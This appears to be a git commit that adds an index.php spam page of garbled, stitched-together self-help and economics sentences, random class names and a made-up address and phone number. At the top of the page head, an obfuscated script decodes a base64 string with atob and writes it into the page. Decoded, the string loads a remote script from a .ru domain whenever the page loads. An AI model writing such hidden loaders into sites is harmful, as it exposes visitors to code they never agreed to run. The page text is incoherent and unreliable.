235c90253c5fb27b6b312d2e8610fcb610e3516a
xprjmofx <80904693+xprjmofx@users.noreply.github.com>
2021-03-18 16:13:30 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9qbzNvanJrMGFyem5zYnFpd2QiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The state cannot face the question of whether or not to exercise</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="7s2c4645rkrow4xwhi97qkh">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="rnhnywzl589li034ynz2r">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The state cannot face the question of whether or not to exercise</h1>
+	</section>
+
+
+	<section class="our-work" class="qvcb8mxmcr40w7mlq210">
+		<h3 class="title">It can influence the course and effectiveness of pr</h3>
+		<p>But this requires a huge amount of self-confidence, openness and willingness to take risks from a person.  Perhaps the table below will help you organize your thoughts: 2.  71.  Reading and meditatingI feel renewed, stronger, properly oriented and capable of further service. </p>
+		<hr>
+
+		<ul class="grid" class="1rcwjp0unfrb37zyo67fbfeh">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="qvcb8mxmcr40w7mlq210">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>The highest manifestations of synergy arise then,when we face the most difficult challenges in life and focus on these four unique huma</td>
+    <td>I am constantly on my toes.  He desperately needed help.  Another common center is the family.This center may appear natural </td>
+    <td>They become reactive, their enemy is at the center of their vital interests.  24.  In order to understand, it is necessary to take into accoun</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>The price of a commodity fluctuates around the average socially necessary expenditure of labor.  Profit maximization in the context of monopolistic com</td>
+    <td>Our relationship is very dear to me, and I want to understand you.  On the other hand, if you only care about the goose, forgetting about the golden</td>
+    <td>As a result, the consumer receives a surplus of utility on all previous (except for the last) units of the purchased product.  In alm</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>A practice that works in one case may not necessarily work in another, as parents who tried to raise a second child after</td>
+    <td>In their expanded perceptions, there are relational values ​​that uplift and inspire all of us.  Since it is meant to work for you, </td>
+    <td>Examples of industries dominated by monopolistic competition are retail trade, production of perfumery, household appliances and electronics, and outerwear.  His i</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="7s2c4645rkrow4xwhi97qkh">
+		<h3 class="title">It is difficult to start any research unti</h3>
+		<p>Even when we find ourselves in the midst of people and circumstances that ignore principles, we can feel safe in the knowledge that principles are more than people and circumstances, and that many thousands of years of human history testify to their unchanging triumph.  Confrontation requires considerable courage, and many prefer to follow the line of least resistance - to humiliate, criticize,give out other people's secrets or gossip about someone behind your back.  And the apparent inability of students to learn was only evidence of the lack of flexibility in teachers.  This is not to say that the elements of Personality Ethics, such as personal development, teaching communication skills, and teaching influence and positive thinking, are not useful or sometimes essential to success.  Before exercising, the muscles are relaxed and warmed, preparing for intense exercise.After exercising, stretching helps to dissipate lactic acid so that the muscles do not feel pain and tension.  Unity (or agreement) is complementarity, not sameness.  Inner orientation is based on momentary emotions.  There are positive consequences when we live according to these principles.  It is here that we use our gift of imagination to mentally create, visually present the desired end goal, which gives direction and meaning to our endeavors and fills the points of our personal constitution with content. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="rnhnywzl589li034ynz2r" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="qvcb8mxmcr40w7mlq210">
+		<h3 class="title">- What did you like the most? - I do not know.  Admitting that </h3>
+		<p>But I very much ask you to support him! If our Emotional Banking Account is positive, then I will certainly support you.  Excess is the excess of supply over demand.In a competitive environment, the presence of surplus leads to lower prices.  The key to solving the problem was to create a reward system,truly in line with the Win / Win spirit.  This is hardly a waste of time, given the tremendously beneficial impact our exercises will have for the remaining 162-165 hours of the week.  The main factors causing inflation: the release of surplus money supply into circulation, a drop in production volumes, disproportions in the development of economic sectors, a budget deficit, and a lag in the production of goods from effective demand.  And expectations (as well as satisfaction) are in our Circle of Influence. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="1rcwjp0unfrb37zyo67fbfeh" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="1rcwjp0unfrb37zyo67fbfeh" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="7s2c4645rkrow4xwhi97qkh">
+		<h3 class="title">Manufacturers, for their part, take targeted action</h3>
+		<p>However, IВМ believes in the dignity and worth of the individual.  Your sense of personal security is as vulnerable as your family.  The institution of bankruptcy is one of the most important mechanisms for ensuring the social responsibility of entrepreneurs in a market economy.  Therefore, naturally, they occupy a monopoly position in the market.  Now let's see how Habit 3 ranks in the system of other skills.  " Although people in their lives and relationships see only what is predetermined by paradigms or maps generated by their experience and conditions of existence, such maps are not territory.  Instead of using a roadmapyou are using a compass.  He begins to trust you with his innermost feelings and thoughts.  The phases of distribution and exchange of labor involve the hiring, firing and relocation of workers; 3) use.  Maybe,a sense of ownership must come before the need to share. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="rnhnywzl589li034ynz2r" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="qvcb8mxmcr40w7mlq210">
+		<h3 class="title">These costs are not covered by contracts t</h3>
+		<p>After reading the text, I admitted: - Yes, an impressive document! But I know many other companies that have great Missions.  Your behavior directly depends on your character, that is, on the factwhat you really are - not from what others say about you or how you want to appear in my eyes.  The mall managers spent very little time on the store owners.  Patent law deals with industrial property, i.e.  What to do then? Education is essential.  This principle is the key to effective interpersonal communication.  Choose one of these actions and write it down as your goal for the coming week. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="1rcwjp0unfrb37zyo67fbfeh" class="title">In fig.  But I cannot neglect it and either still fulfill it, o</h3>	
+		<p>- What do you mean "old woman"! This woman is no more than 20-22 years old! - Come on, come on! Are you kidding me? She is 70 or even 80 years old! - What are you, blind? This is a young woman.  - Want to see the Mission of this hotel? The director asked.  only until anger and irritation pull them back to Win / Lose.“Lose / Lose” When two people converge with a “Win ​​/ Lose” attitude - that is, two decisive, stubborn, selfish natures interact - the result is “Lose / Lose”.  Income acts as a monetary realization of the economic interest of the entrepreneur.  So, the more power is concentrated in the hands of an individual, the higher the cost of mistakes and abuse.  Thus, in the long term, in the context of interdependence, the Win / Lose attitude turns into a Lose / Lose attitude.  The parent who delegates washing dishes to the child is the manager. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="7s2c4645rkrow4xwhi97qkh">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="rnhnywzl589li034ynz2r"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="qvcb8mxmcr40w7mlq210"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="1rcwjp0unfrb37zyo67fbfeh"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>613 Wunsch Station, Suite 556, 31326-8604, Carmeloborough, Arizona, United States</p>
+		<p>Phone number: +59(80)122-20621</p>
+	</footer>
+
+</body>
+
+</html>
